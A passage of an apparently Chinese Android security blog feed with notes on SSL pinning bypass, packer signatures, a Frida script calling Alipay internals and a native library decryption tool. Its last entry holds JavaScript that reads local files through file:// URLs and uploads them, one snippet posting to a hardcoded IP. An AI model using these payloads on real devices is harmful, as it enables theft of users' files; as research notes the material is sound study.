href="https://xz.aliyun.com/t/2098" target="_blank" rel="noopener">https://xz.aliyun.com/t/2098</a> 安卓证书锁定解除的工具</li><li><a href="https://www.nevermoe.com/2018/11/20/openssl%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/" target="_blank" rel="noopener">https://www.nevermoe.com/2018/11/20/openssl%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/</a> 安装Android自定义证书</li><li><a href="https://blog.freessl.cn/ssl-cert-format-introduce/" target="_blank" rel="noopener">https://blog.freessl.cn/ssl-cert-format-introduce/</a>  SSL证书格式普及PEM、CER、JKS、PKCS12</li><li><a href="https://blog.ropnop.com/configuring-burp-suite-with-android-nougat/" target="_blank" rel="noopener">https://blog.ropnop.com/configuring-burp-suite-with-android-nougat/</a> 在Android Nougat中正确配置Burp Suite</li><li><a href="https://blog.nviso.be/2017/12/22/intercepting-https-traffic-from-apps-on-android-7-using-magisk-burp/" target="_blank" rel="noopener">https://blog.nviso.be/2017/12/22/intercepting-https-traffic-from-apps-on-android-7-using-magisk-burp/</a></li><li><a href="https://support.portswigger.net/customer/portal/questions/17281202-intercepting-android-version-8-1-https-traffic" target="_blank" rel="noopener">https://support.portswigger.net/customer/portal/questions/17281202-intercepting-android-version-8-1-https-traffic</a></li><li><a href="https://developer.android.com/training/articles/security-ssl#java" target="_blank" rel="noopener">https://developer.android.com/training/articles/security-ssl#java</a></li><li><a href="https://xz.aliyun.com/t/2440" target="_blank" rel="noopener">https://xz.aliyun.com/t/2440</a> SSL Pinning Practice</li><li><a href="http://www.wisedream.net/2017/03/17/cryption/crack-mutual-auth/" target="_blank" rel="noopener">http://www.wisedream.net/2017/03/17/cryption/crack-mutual-auth/</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Android加固厂商特征（转）</title>
      <link href="/2018/02/28/Android%E5%8A%A0%E5%9B%BA%E5%8E%82%E5%95%86%E7%89%B9%E5%BE%81%EF%BC%88%E8%BD%AC%EF%BC%89/"/>
      <url>/2018/02/28/Android%E5%8A%A0%E5%9B%BA%E5%8E%82%E5%95%86%E7%89%B9%E5%BE%81%EF%BC%88%E8%BD%AC%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>from <a href="https://bbs.pediy.com/thread-223248.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-223248.htm</a></p><p>娜迦<br>libchaosvmp.so , libddog.solibfdog.so</p><p>爱加密<br>libexec.so, libexecmain.so，ijiami.dat</p><p>梆梆<br>libsecexe.so, libsecmain.so,libSecShell.so</p><p>梆梆企业版<br>libDexHelper.so , libDexHelper-x86.so<br><a id="more"></a><br>360<br>libprotectClass.so, libjiagu.so<br>libjiagu.so, libjiagu_art.so<br>libjiagu.so, libjiagu_x86.so</p><p>通付盾<br>libegis.so，libNSaferOnly.so</p><p>网秦<br>libnqshield.so</p><p>百度<br>libbaiduprotect.so</p><p>阿里聚安全<br>aliprotect.dat，libsgmain.so，libsgsecuritybody.so<br>libsgmain.so、libsgsecuritybody.so</p><p>腾讯<br>libtup.so, libexec.so，libshell.so<br>mix.dex<br>lib/armeabi/mix.dex ,lib/armeabi/mixz.dex</p><p>腾讯御安全<br>libtosprotection.armeabi.so，<br>libtosprotection.armeabi-v7a.so，<br>libtosprotection.x86.so</p><p>网易易盾<br>libnesec.so</p><p>APKProtect<br>libAPKProtect.so</p><p>几维安全<br>libkwscmm.so, libkwscr.so, libkwslinker.so</p><p>顶像科技<br>libx3g.so</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>frida导出函数任意调用</title>
      <link href="/2018/02/08/frida%E5%AF%BC%E5%87%BA%E5%87%BD%E6%95%B0%E4%BB%BB%E6%84%8F%E8%B0%83%E7%94%A8/"/>
      <url>/2018/02/08/frida%E5%AF%BC%E5%87%BA%E5%87%BD%E6%95%B0%E4%BB%BB%E6%84%8F%E8%B0%83%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>除了hook外，frida提供了rpc接口，可以导出某一个指定的函数，实现随时对其进行调用。</p><p>1.js中指定导出的类和函数，并采用new方法创建一个实例，python文件中导入1.js,输入对应的参数调用即可。如果通过http的方式传递参数，就可以变为一个服务框架，例如salt写的Hrida。（<a href="https://github.com/5alt/hrida）" target="_blank" rel="noopener">https://github.com/5alt/hrida）</a><br><a id="more"></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time,os</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">js_code = <span class="string">'''</span></span><br><span class="line"><span class="string">rpc.exports = &#123;</span></span><br><span class="line"><span class="string">    myfunc: function(aa,bb,cc)&#123;</span></span><br><span class="line"><span class="string">    var result = null;</span></span><br><span class="line"><span class="string">        Java.perform(function () &#123;</span></span><br><span class="line"><span class="string">            try&#123;</span></span><br><span class="line"><span class="string">                var classf = Java.use('com.alipay.android.phone.wallet.sharetoken.service.f');</span></span><br><span class="line"><span class="string">                result = classf.a(aa,bb,cc);//a为static函数</span></span><br><span class="line"><span class="string">                //f = Hrida.$new(); 非static函数需要new一个实例</span></span><br><span class="line"><span class="string">                console.log("myfunc result: "+result);</span></span><br><span class="line"><span class="string">               </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">                console.log(e)</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;);</span></span><br><span class="line"><span class="string">        return result</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_message_handler</span><span class="params">(message, payload)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> message</span><br><span class="line">    <span class="keyword">print</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rdev = frida.get_usb_device()</span><br><span class="line">session = rdev.attach(<span class="string">"com.eg.android.AlipayGphone"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">script = session.create_script(js_code)</span><br><span class="line">script.on(<span class="string">"message"</span>, my_message_handler)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">command = <span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">    command = raw_input(<span class="string">"Enter command:\n9999: Exit\nothers: Call secret function\nchoice:"</span>)</span><br><span class="line">    <span class="keyword">if</span> command == <span class="string">"9999"</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    a = <span class="string">"b54578ff9d5fcbf6d26ecefced9a2cf27ea6b88d07328f338a31e4437c5caf9fe0fc44cf068c9196bd81412c70ad7b0dfc4e2c91c4d729509ef61e3a669897181ade46ef836b2e3404193fbeb074065384a17620c05afa7d7426c27b804cd108"</span></span><br><span class="line">        b = <span class="keyword">None</span></span><br><span class="line">        c = <span class="string">"快来吱付寳，赐我富强福，一起集五福迎新春！丹昂达菏P辰霆3勾闲岔FUdldo"</span></span><br><span class="line">        script.exports.myfunc(a,b,c)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Android直接执行so里的函数</title>
      <link href="/2018/02/06/Android%E7%9B%B4%E6%8E%A5%E6%89%A7%E8%A1%8Cso%E9%87%8C%E7%9A%84%E5%87%BD%E6%95%B0/"/>
      <url>/2018/02/06/Android%E7%9B%B4%E6%8E%A5%E6%89%A7%E8%A1%8Cso%E9%87%8C%E7%9A%84%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//decrypt_db in.db out.db key</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//char key_in[256] = "thMSot/QNM/iFsDVNksPtXHiqi0wxjD0m2SMLipLEQ4=";</span></span><br><span class="line">    <span class="keyword">char</span> *in_db = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">char</span> *out_db = argv[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *key_in = argv[<span class="number">3</span>];</span><br><span class="line"><span class="keyword">char</span> key_out[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *p;</span><br><span class="line">    <span class="keyword">void</span> (*key_func)(<span class="keyword">char</span> *, <span class="keyword">char</span> *);</span><br><span class="line">    <span class="keyword">void</span> (*decrypt)(<span class="keyword">char</span> *, <span class="keyword">char</span> *, <span class="keyword">char</span> *);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//dlopen</span></span><br><span class="line">    p=dlopen(<span class="string">"./libdatabase_sqlcrypto.so"</span>,RTLD_NOW);</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"dlopen error!\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"dlopen ok!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//dlsym aes_decrypt_key128</span></span><br><span class="line">    key_func=dlsym(p, <span class="string">"aes_decrypt_key128"</span>);</span><br><span class="line">    key_func(key_in, key_out);</span><br><span class="line">    <span class="comment">//printf("key_in:%s\n", key_in);</span></span><br><span class="line">    <span class="comment">//printf("key_out:%s\n", key_out);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> cipher[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> plain[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//read cipher</span></span><br><span class="line">    FILE *fp_read;</span><br><span class="line">fp_read = fopen(in_db, <span class="string">"rb"</span>);</span><br><span class="line">FILE *fp_write;</span><br><span class="line">fp_write = fopen(out_db, <span class="string">"wb"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//dlsym aes_decrypt</span></span><br><span class="line">decrypt=dlsym(p, <span class="string">"aes_decrypt"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(fread(cipher, <span class="number">1</span>, <span class="number">16</span>, (FILE*)fp_read) == <span class="number">16</span>) <span class="comment">//read cipher</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//decrypt</span></span><br><span class="line">    decrypt(cipher, plain, key_out);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//write plain</span></span><br><span class="line">fwrite(plain, <span class="number">1</span>, <span class="number">16</span>, (FILE*)fp_write);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose(fp_read);</span><br><span class="line">fclose(fp_write);</span><br><span class="line">    dlclose(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Ajax读取本地文件</title>
      <link href="/2018/01/24/xmlHttpRequest%E8%AF%BB%E5%8F%96%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6/"/>
      <url>/2018/01/24/xmlHttpRequest%E8%AF%BB%E5%8F%96%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="关于Ajax"><a href="#关于Ajax" class="headerlink" title="关于Ajax"></a>关于Ajax</h2><p>AJAX 是一种在无需重新加载整个网页的情况下，能够更新部分网页的技术。</p><p>所有现代浏览器均支持 XMLHttpRequest 对象（IE5 和 IE6 使用 ActiveXObject）。</p><p>XMLHttpRequest 用于在后台与服务器交换数据。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。<br><a id="more"></a></p><h2 id="关于XMLHttpRequest"><a href="#关于XMLHttpRequest" class="headerlink" title="关于XMLHttpRequest"></a>关于XMLHttpRequest</h2><ul><li><p>XMLHttpRequest两个方法</p><ul><li><p>open(method,url,async)     规定请求的类型、URL 以及是否异步处理请求。</p><ul><li>method：请求的类型；GET 或 POST</li><li>url：文件在服务器上的位置</li><li>async：true（异步）或 false（同步）</li></ul></li><li><p>send(string)<br>将请求发送到服务器。string：仅用于 POST 请求</p></li></ul></li><li><p>onreadystatechange 事件</p><p>  当请求被发送到服务器时，我们需要执行一些基于响应的任务。每当 readyState 改变时，就会触发 onreadystatechange 事件。readyState 属性存有 XMLHttpRequest 的状态信息。</p></li></ul><p><img src="/images/pasted-10.png" alt="upload successful"></p><p>在 onreadystatechange 事件中，我们规定当服务器响应已做好被处理的准备时所执行的任务。</p><p>当 readyState 等于 4 且状态为 200 时，表示响应已就绪：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (xmlhttp.readyState==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">"myDiv"</span>).innerHTML=xmlhttp.responseText;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="以下为读取本地文件的代码："><a href="#以下为读取本地文件的代码：" class="headerlink" title="以下为读取本地文件的代码："></a>以下为读取本地文件的代码：</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"info"</span>&gt;</span></span><br><span class="line">Info will be listed as follow:</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">//start();</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> out = <span class="built_in">document</span>.getElementById(<span class="string">"info"</span>)</span></span><br><span class="line"><span class="undefined">    alert(111);</span></span><br><span class="line"><span class="undefined">    alert(location);</span></span><br><span class="line"><span class="javascript">    out.innerHTML+=<span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="undefined">    out.innerHTML+=location;</span></span><br><span class="line"><span class="javascript">    out.innerHTML+=<span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> path = location;<span class="comment">//自己读自己，在权限允许条件下path改为其他路径即可</span></span></span><br><span class="line"><span class="undefined">    </span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    </span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> x = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    x.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (x.readyState === <span class="number">4</span>) &#123;  </span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (x.status === <span class="number">200</span>) &#123;  </span></span><br><span class="line"><span class="javascript">              <span class="built_in">console</span>.log(oXHR.responseText);  </span></span><br><span class="line"><span class="xml">              out.innerHTML+="<span class="comment">&lt;!-- "+x.response+" --&gt;</span>";</span></span><br><span class="line"><span class="javascript">              <span class="comment">//不注释的话，可能不显示js</span></span></span><br><span class="line"><span class="javascript">            &#125; <span class="keyword">else</span> &#123;  </span></span><br><span class="line"><span class="undefined">                </span></span><br><span class="line"><span class="javascript">               out.innerHTML+=<span class="string">"&lt;br&gt;readyState: "</span>+x.readyState;</span></span><br><span class="line"><span class="xml">               out.innerHTML+="<span class="tag">&lt;<span class="name">br</span>&gt;</span>status:<span class="tag">&lt;<span class="name">br</span>&gt;</span>"+x.status;</span></span><br><span class="line"><span class="javascript">               out.innerHTML+=<span class="string">"&lt;br&gt;responseText: "</span>+x.responseText+<span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="javascript">               out.innerHTML+=<span class="string">"&lt;br&gt;responseXML: "</span>+x.responseXML+<span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="xml">               out.innerHTML+="<span class="tag">&lt;<span class="name">br</span>&gt;</span>response:<span class="tag">&lt;<span class="name">br</span>&gt;</span> "+"<span class="comment">&lt;!-- "+x.response+" --&gt;</span>";</span></span><br><span class="line"><span class="undefined">            &#125;  </span></span><br><span class="line"><span class="undefined">        &#125;  </span></span><br><span class="line"><span class="undefined">        /*</span></span><br><span class="line"><span class="javascript"><span class="comment">//文件内容上传到远程服务器</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//alert(x.response);</span></span></span><br><span class="line"><span class="undefined">        </span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> url = <span class="string">"http://118.89.200.48/jm/test1.php"</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">        xhr.open(<span class="string">"POST"</span>, url, <span class="literal">true</span>);</span></span><br><span class="line"><span class="undefined">        xhr.send(x.response);</span></span><br><span class="line"><span class="undefined">        */</span></span><br><span class="line"><span class="undefined">    &#125;;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    x.open(<span class="string">"GET"</span>, path, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">    <span class="comment">//x.responseType = 'arraybuffer';</span></span></span><br><span class="line"><span class="undefined">    x.send();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="上传整个目录（Android-lt-8-0测试过）"><a href="#上传整个目录（Android-lt-8-0测试过）" class="headerlink" title="上传整个目录（Android&lt;8.0测试过）"></a>上传整个目录（Android&lt;8.0测试过）</h2><p>*注意这里需要指定responseType = ‘arraybuffer’;<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"> &lt;script&gt;</span><br><span class="line"> <span class="comment">//读取单个文件</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">path</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> x = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">x.open(<span class="string">"GET"</span>, path, <span class="literal">false</span>);</span><br><span class="line">x.onload = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123; </span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.response;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line">x.send(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">return</span> x.response;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//发送单个文件</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params">path,remoteUrl</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  xhr.open(<span class="string">'GET'</span>,path,<span class="literal">true</span>);</span><br><span class="line">  xhr.responseType = <span class="string">'arraybuffer'</span>;</span><br><span class="line">  xhr.onload = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">     res = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(xhr.response)</span><br><span class="line">     <span class="keyword">var</span> xhr1 = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">     xhr1.open(<span class="string">'POST'</span>,remoteUrl,<span class="literal">true</span>);</span><br><span class="line">     xhr1.send(res.buffer);</span><br><span class="line">  &#125;</span><br><span class="line">  xhr.send();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//解析目录结构</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parseText</span>(<span class="params">text</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> parent = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">var</span> lines = text.split(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;lines.length;i++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> line = lines[i].replace(<span class="string">"&lt;script&gt;"</span>,<span class="string">""</span>).replace(<span class="string">"&lt;\/script&gt;"</span>,<span class="string">""</span>);</span><br><span class="line">    <span class="keyword">if</span>(line.substring(<span class="number">0</span>,line.indexOf(<span class="string">"("</span>)) == <span class="string">"start"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//first line </span></span><br><span class="line">parent = line.split(<span class="string">"\""</span>)[<span class="number">1</span>];</span><br><span class="line"><span class="comment">//document.write("Scan --------"+parent+"--------:"+"&lt;br&gt;");</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//alert(parent);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(line.substring(<span class="number">0</span>,line.indexOf(<span class="string">"("</span>)) == <span class="string">"addRow"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">var</span> file = line.split(<span class="string">"\""</span>)[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> (file ==<span class="string">".."</span>) <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">var</span> type = line.split(<span class="string">","</span>)[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">if</span>(type == <span class="string">"1"</span>)<span class="comment">//mulu </span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//alert("mulu:"+file);</span></span><br><span class="line"><span class="comment">//alert("file://"+parent+file);</span></span><br><span class="line"><span class="comment">//document.write("dir: "+parent+file+"&lt;br&gt;");</span></span><br><span class="line">readDir(<span class="string">"file://"</span>+parent+file);</span><br><span class="line"></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span><span class="comment">//wen jian</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//alert("wenjian:"+file);</span></span><br><span class="line"><span class="comment">//document.write("file: "+parent+file+"&lt;br&gt;");</span></span><br><span class="line">remote = remoteUrl+<span class="string">"?filename="</span>+parent+file;</span><br><span class="line">send(<span class="string">"file://"</span>+parent+file,remote);</span><br><span class="line"></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span 